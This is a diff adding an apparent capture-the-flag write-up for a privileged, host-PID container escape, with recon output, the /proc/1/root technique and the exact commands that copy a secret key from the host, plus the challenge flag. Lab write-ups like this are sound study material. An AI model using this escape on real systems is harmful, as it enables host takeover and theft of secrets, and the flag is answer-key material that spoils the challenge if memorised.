@@ -1,0 +1,25 @@
+goal: Privileged + host-PID container escape ("Nothing to Trigger", no CVE
+needed). Read /opt/node/rotation.key and write it to /opt/node/.proof on the
+real node, then run `verify`.
+
+recon:
+- SSH login (privileged-hostpid-escape@204.168.229.209:2223) drops into a
+  BusyBox ash root shell.
+- `id` -> uid=0 gid=0. `cat /proc/1/status | grep -i cap` -> CapEff/CapBnd/etc
+  all = 000001ffffffffff (essentially every capability) — container was run
+  --privileged.
+- `ps aux` showed HOST processes, not just this container's own: PID 1
+  "sleep infinity", dockerd, containerd, containerd-shim, and even our own
+  `docker exec -it foothold /bin/sh -l` session — confirms --pid=host (host
+  PID namespace shared into the container).
+- No nsenter/chroot binaries available, but none needed: with the host PID
+  namespace visible, /proc/1/root/ is a magic symlink into PID 1's mount
+  namespace, i.e. the real node's root filesystem. Root inside the
+  container can read/write straight through it.
+
+exploit/steps (chain immediately into verify — rotation.key is a
+live-rotating secret, see phantom2/level1/notes.txt):
+  cat /proc/1/root/opt/node/rotation.key > /proc/1/root/opt/node/.proof
+  verify
+
+flag: bl_c9af1d5b807829ab7436ef3b6a7c5373
